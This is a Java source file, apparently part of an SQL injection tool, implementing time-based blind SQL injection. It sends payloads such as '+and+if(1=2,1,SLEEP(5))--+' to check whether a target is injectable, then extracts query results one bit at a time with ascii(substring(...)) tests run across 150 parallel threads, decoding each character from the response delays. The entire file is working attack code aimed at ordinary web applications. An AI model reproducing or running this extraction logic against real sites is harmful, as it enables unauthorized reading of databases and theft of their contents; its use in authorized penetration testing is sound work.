package mvc.model.blind;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

import exception.PreparationException;
import exception.StoppableException;

import mvc.model.InjectionModel;
import mvc.model.Interruptable;
import mvc.model.Stoppable;


public class TimeInjection {
	private String initialUrl;
	
	private long timeMatch = 5;

	private InjectionModel injectionModel;
	
	boolean isTimeInjectable = true;

	public TimeInjection(InjectionModel newModel, String initialUrl){
		injectionModel = newModel;
		
		if(injectionModel.isProxyfied){
			System.setProperty("http.proxyHost", injectionModel.proxyAdress);
			System.setProperty("http.proxyPort", injectionModel.proxyPort);
		}

//		this.initialUrl = initialUrl;
		this.initialUrl = "";
		
		String[] falseTest = {"true=false","true%21=true","false%21=false","1=2","1%21=1","2%21=2"};
				
		String[] trueTest = {"true=true","false=false","true%21=false","1=1","2=2","1%21=2"};
		
//		System.out.println(injectionModel.stopFlag);
		if(injectionModel.stopFlag)return;
		
		/* appelle les urls false */
		ExecutorService executorFalseMark = Executors.newCachedThreadPool();
		List<TimeCallable> listCallableFalse = new ArrayList<TimeCallable>();
		for (String urlTest: falseTest){
			listCallableFalse.add(new TimeCallable(/*initialUrl+*/"+and+if("+urlTest+",1,SLEEP("+timeMatch+"))--+"));
		}

		List<Future<TimeCallable>> listFalseMark = null;
		try {
			listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
		
		executorFalseMark.shutdown();
		
		try {
			for(Future<TimeCallable> falseMark: listFalseMark){
//				System.out.println(injectionModel.stopFlag);
				if(injectionModel.stopFlag)return;

				if(((TimeCallable) falseMark.get()).isTrue()){
					isTimeInjectable = false;
					return;
				}
			}
		} catch (InterruptedException e2) {
			e2.printStackTrace();
		} catch (ExecutionException e2) {
			e2.printStackTrace();
		}
		
		/* appelle les urls true */
		ExecutorService executorTrueMark = Executors.newCachedThreadPool();
		List<TimeCallable> listCallableTrue = new ArrayList<TimeCallable>();
		for (String urlTest: trueTest){
			listCallableTrue.add(new TimeCallable(/*initialUrl+*/"+and+if("+urlTest+",1,SLEEP("+timeMatch+"))--+"));
		}

		List<Future<TimeCallable>> listTrueMark;
		try {
			listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
			return;
		}
		
		executorTrueMark.shutdown();

		try {
			for(Future<TimeCallable> falseMark: listTrueMark){
//				System.out.println(injectionModel.stopFlag);
				if(injectionModel.stopFlag)return;

				if(!((TimeCallable) falseMark.get()).isTrue()){
					isTimeInjectable = false;
					return;
				}
			}
		} catch (InterruptedException e2) {
			e2.printStackTrace();
		} catch (ExecutionException e2) {
			e2.printStackTrace();
		}
	}
	
	public String inject(String inj, Interruptable interruptable, Stoppable s) throws StoppableException{
		final boolean IS_LENGTH_TEST = true;
		
		List<char[]> bytes = new ArrayList<char[]>();
		int indexCharacter = 0;

		ExecutorService taskExecutor = Executors.newFixedThreadPool(150);
        CompletionService<TimeCallable> taskCompletionService = new ExecutorCompletionService<TimeCallable>(taskExecutor);

        taskCompletionService.submit(new TimeCallable(/*initialUrl+*/"+and+if(char_length("+inj+")>0,1,SLEEP("+timeMatch+"))--+", IS_LENGTH_TEST));
        int submittedTasks = 1;
        
        while( submittedTasks > 0 ){
        	if(s.isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())){
        		taskExecutor.shutdown();

        		// Wait for termination
        		boolean success = false;
				try {
					success = taskExecutor.awaitTermination(0, TimeUnit.SECONDS);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
        		if (!success) {
        		    // awaitTermination timed out, interrupt everyone
        			taskExecutor.shutdownNow();
        		}

        		throw new StoppableException();
        	}
			try {
	        	TimeCallable currentCallable = taskCompletionService.take().get();
	        	submittedTasks--;
				if(currentCallable.isLengthTest){
					if( currentCallable.isTrue() ){
						indexCharacter++;
						bytes.add(new char[]{'x','x','x','x','x','x','x','x'});
						taskCompletionService.submit(new TimeCallable(/*initialUrl+*/"+and+if(char_length("+inj+")>"+indexCharacter+",1,SLEEP("+timeMatch+"))--+", IS_LENGTH_TEST));
						for(int bit: new int[]{1,2,4,8,16,32,64,128}){
							taskCompletionService.submit(new TimeCallable(/*initialUrl+*/"+and+if(ascii(substring("+inj+","+indexCharacter+",1))%26"+bit+",1,SLEEP("+timeMatch+"))--+", indexCharacter, bit));
						}
						submittedTasks += 9;
					}
				}else{
					char[] e = bytes.get(currentCallable.currentIndex-1);
					e[(int) (8 - ( Math.log(2)+Math.log(currentCallable.currentBit) )/Math.log(2)) ] = currentCallable.isTrue() ? '1' : '0';
					
					try{
                        int charCode = Integer.parseInt(new String(e), 2);
                        String str = new Character((char)charCode).toString();
                        injectionModel.new GUIThread("binary-message","\t"+new String(e)+"="+str).run();
                    }catch(NumberFormatException err){}
				}
//	        	System.out.println(currentCallable.blindUrl);
			} catch (InterruptedException e) {
				e.printStackTrace();
			} catch (ExecutionException e) {
				e.printStackTrace();
			}
        }
        
        try {
	        taskExecutor.shutdown();
			taskExecutor.awaitTermination(60, TimeUnit.MINUTES);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
        
		String result = "";
		for(char[] c: bytes){
			int charCode = Integer.parseInt(new String(c), 2);
			String str = new Character((char)charCode).toString();
			result += str;
		}	
//		System.out.println("nb caractères: "+indexChar);
//		System.out.println("résultat: "+result);
		return result;
	}
	
	private class TimeCallable implements Callable<TimeCallable>{
		private String timeUrl;
		
		Calendar calendar1 = Calendar.getInstance();
	    Calendar calendar2 = Calendar.getInstance();
	    long diffSeconds;
	    
		private int currentIndex;
		private int currentBit;
		
		private boolean isLengthTest = false;
		
		TimeCallable(String timeUrl){
			this.timeUrl = timeUrl;
		}
		TimeCallable(String newUrl, int newIndex, int newBit){
			this(newUrl);
			currentIndex = newIndex;
			currentBit = newBit;
		}
		TimeCallable(String newUrl, boolean newIsLengthTest){
			this(newUrl);
			isLengthTest = newIsLengthTest;
		}
		
		public boolean isTrue() {
			return diffSeconds < timeMatch;
		}

		@Override
		public TimeCallable call() throws Exception {
			calendar1.setTime(new Date());
			callUrl(timeUrl);
			calendar2.setTime(new Date());
		    long milliseconds1 = calendar1.getTimeInMillis();
		    long milliseconds2 = calendar2.getTimeInMillis();
		    long diff = milliseconds2 - milliseconds1;
		    diffSeconds = diff / 1000;
//		    System.out.println(diffSeconds);
			return this;
		}
	}
	
	public String callUrl(String urlString){
		return injectionModel.inject(injectionModel.insertionCharacter + urlString);
	}
	
	public boolean isTimeInjectable() throws PreparationException{
		if(injectionModel.stopFlag)
			throw new PreparationException();
		
		TimeCallable blindTest = new TimeCallable(/*initialUrl+*/"+and+if(0%2b1=1,1,SLEEP("+timeMatch+"))--+");
		try {
			blindTest.call();
		} catch (Exception e) {
			e.printStackTrace();
		}

		return isTimeInjectable && blindTest.isTrue();
	}
}
